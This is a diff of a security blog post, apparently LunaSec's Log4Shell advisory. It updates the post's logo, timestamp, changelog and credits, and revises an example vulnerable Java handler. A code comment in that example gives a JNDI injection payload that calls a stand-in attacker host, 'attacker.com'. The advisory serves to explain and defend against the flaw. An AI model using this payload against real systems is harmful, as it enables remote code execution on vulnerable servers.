@@ -2,6 +2,7 @@
 title: "Log4Shell: RCE 0-day exploit found in log4j, a popular Java logging package"
 description: Given how ubiquitous this library is, the impact of this vulnerability is quite severe. Learn how to patch it, why it's bad, and more in this post.
 slug: log4j-zero-day
+image: https://www.lunasec.io/docs/img/log4shell-logo.png
 authors:
 - name: Free Wortley 
   title: CEO at LunaSec 
@@ -28,7 +29,9 @@ authors:
   ~
 -->
 
-_Updated @ December 10th, 1:30am PST_
+![Log4Shell Logo](https://www.lunasec.io/docs/img/log4shell-logo.png)
+
+_Updated @ December 10th, 8am PST_
 
 A few hours ago, a 0-day exploit in the
 popular Java logging library `log4j` was discovered that results in Remote Code Execution (RCE) by
@@ -121,7 +124,7 @@ public class VulnerableLog4jExampleHandler implements HttpHandler {
     
     // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
     // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
-    log.info("Request User Agent:" + userAgent);
+    log.info("Request User Agent:{}", userAgent);
 
     String response = "<h1>Hello There, " + userAgent + "!</h1>";
     he.sendResponseHeaders(200, response.length());
@@ -175,6 +178,7 @@ methods are still prevalent.
 3. Update mitigation steps with newer information.
 4. Removed the name "LogJam" because it's already been [used](https://en.wikipedia.org/wiki/Logjam_(computer_security)). Using "Log4Shell" instead.
 5. Update that 2.15.0 is released.
+6. Added the MS Paint logo[4], and updated example code to be slightly more clear (it's not string concatenation).
 
 ### References
 
@@ -184,5 +188,6 @@ methods are still prevalent.
 
 [3] https://issues.apache.org/jira/browse/LOG4J2-3198
 
-Also kudos to @80vul for [tweeting](https://twitter.com/80vul/status/1468968891489857537) about this.
+[4] Kudos to [@GossiTheDog](https://twitter.com/GossiTheDog/status/1469252646745874435) for the MS Paint logo!
 
+Also kudos to @80vul for [tweeting](https://twitter.com/80vul/status/1468968891489857537) about this.
